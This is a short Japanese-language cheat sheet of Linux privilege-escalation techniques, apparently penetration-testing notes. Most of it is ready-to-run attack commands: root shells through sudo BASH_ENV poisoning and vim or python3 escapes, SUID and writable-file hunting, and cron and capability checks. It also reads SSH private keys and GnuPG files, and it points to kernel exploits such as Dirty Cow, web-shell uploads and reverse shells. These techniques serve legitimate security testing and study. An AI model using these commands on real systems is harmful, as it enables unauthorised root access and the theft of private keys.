1. Sudo権限を利用した昇格
a. sudo -lで確認
sudo -l

b. sudo 環境変数汚染
echo 'bash -p' > /tmp/exp.sh
chmod +x /tmp/exp.sh
sudo BASH_ENV=/tmp/exp.sh /usr/bin/systeminfo

c. sudo権限があるが環境変数を継承しない場合
sudo -s または sudo -i を試す。

d. sudo 可能なエディタやインタプリタの利用
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'

2. SUIDビット付きファイルの利用
find / -perm -4000 -type f 2>/dev/null
/tmp/bash -p
whoami

3. Writableファイルやディレクトリの調査
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

4. Cronジョブの調査
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all

5. 環境変数を悪用した昇格
PATH の改変や LD_PRELOAD など。
脆弱なスクリプトがroot権限で実行される場合は要チェック。

6. パスワードファイルや鍵の発見
cat ~/.gnupg/*
cat ~/.ssh/id_rsa

7. ローカル脆弱性利用
カーネルやサービスの既知脆弱性がある場合は利用。
例: Dirty Cow, sudo脆弱性など。

8. Webシェルやアップロード経由の昇格
ファイルアップロードで権限奪取。
PHPやPythonで逆シェルを作成し安定した端末を確保。

9. その他Tips
getcap でキャパビリティ付きファイルを探す

getcap -r / 2>/dev/null
権限昇格の鍵になることがある。

PythonでのPTY強化

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
